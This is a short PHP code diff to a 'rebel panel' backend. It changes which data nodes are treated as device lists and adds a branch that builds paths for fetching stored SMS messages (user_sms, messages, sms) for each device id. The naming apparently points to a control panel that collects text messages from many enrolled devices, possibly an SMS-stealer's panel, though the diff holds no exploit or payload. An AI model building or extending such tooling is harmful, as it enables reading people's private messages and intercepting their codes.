@@ -221,7 +221,7 @@ function rebel_panel_device_nodes(): array
 {
     return [
         'clients', 'devices', 'devices_status', 'Verify_Device', 'user_list', 'user_data',
-        'user_sms', 'users', 'All_Users', 'All_User', 'AllClients', 'all_clients',
+        'users', 'All_Users', 'All_User', 'AllClients', 'all_clients',
         'online_devices', 'online_users', 'clients_list', 'client_list', 'online_status',
         'device_list', 'devices_list', 'device_data', 'registered_users', 'active_devices',
         'active_users', 'connected_devices', 'device_status',
@@ -287,6 +287,21 @@ function rebel_sms_paths_for_device(string $deviceId, string $schema = 'rabel', 
         }
         $preferred[] = 'messages/' . $id;
         return array_values(array_unique($preferred));
+    }
+
+    if ($schema === 'rabel' || $deviceNode === 'user_list' || $deviceNode === 'user_data') {
+        $paths[] = 'user_sms/' . $id;
+        $paths[] = 'messages/' . $id;
+        $paths[] = 'sms/' . $id;
+        foreach ($bases as $n) {
+            if ($n === '' || $n === 'user_sms') {
+                continue;
+            }
+            foreach ($suffixes as $sfx) {
+                $paths[] = $n . '/' . $id . '/' . $sfx;
+            }
+        }
+        return array_values(array_unique($paths));
     }
 
     foreach ($bases as $n) {
